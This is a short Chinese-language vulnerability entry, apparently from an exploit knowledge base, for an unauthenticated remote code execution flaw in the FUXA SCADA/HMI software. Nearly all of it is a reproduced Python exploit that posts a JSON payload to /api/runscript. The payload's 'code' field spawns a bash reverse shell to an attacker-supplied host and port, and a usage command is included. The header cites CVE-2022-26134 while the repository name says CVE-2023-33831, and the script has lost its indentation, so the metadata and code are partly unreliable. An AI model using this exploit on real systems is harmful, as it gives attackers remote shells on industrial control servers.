# FUXA存在远程代码执行漏洞

- **系统**：FUXA　|　**类型**：命令执行　|　**CVE**：—

**请求体 / payload**
```
[https://github.com/rodolfomarianocy/Unauthenticated-RCE-FUXA-CVE-2023-33831/blob/main/CVE-2023-33831.py](https://github.com/rodolfomarianocy/Unauthenticated-RCE-FUXA-CVE-2023-33831/blob/main/CVE-2023-33831.py)
python CVE-2023-33831.py --rhost <ip> --rport <rport> --lhost <lhost> --lport <lport>
# Exploit Title: FUXA V.1.1.13-1186 - Unauthenticated Remote Code Execution (RCE)
# Date: 18/04/2023
# Exploit Author: Rodolfo Mariano
# Vendor Homepage: [https://github.com/frangoteam/FUXA](https://github.com/frangoteam/FUXA)
# Version: FUXA V.1.1.13-1186
# CVE: CVE-2022-26134
# [https://github.com/rodolfomarianocy/](https://github.com/rodolfomarianocy/)
from argparse import RawTextHelpFormatter
import argparse, requests
def main(rhost, rport, lhost, lport):
url = "http://"+rhost+":"+rport+"/api/runscript"
payload = {
"headers":
"normalizedNames":{},
"lazyUpdate": "null"
},
"params":{
"script":{
"parameters":[
"name":"ok",
"type":"tagid",
"value":""
],
"mode":"",
"id":"",
"test":"true",
"name":"ok",
"outputId":"",
"code":"require('child_process').exec('/bin/bash -c \"/bin/sh -i >& /dev/tcp/%s/%s 0>&1\"')" % (lhost,lport)
try:
response = requests.post(url, json=payload)
except requests.exceptions.ConnectionError:
print("url connection error")
parser = argparse.ArgumentParser(formatter_class=RawTextHelpFormatter, usage="python exploit.py --rhost <ip> --rport <rport> --lhost <lhost> --lport <lport>")
parser.add_argument('--rhost', dest='rhost', action='store', type=str, help='insert an …（脚本共 1931 字，完整版见原文）
```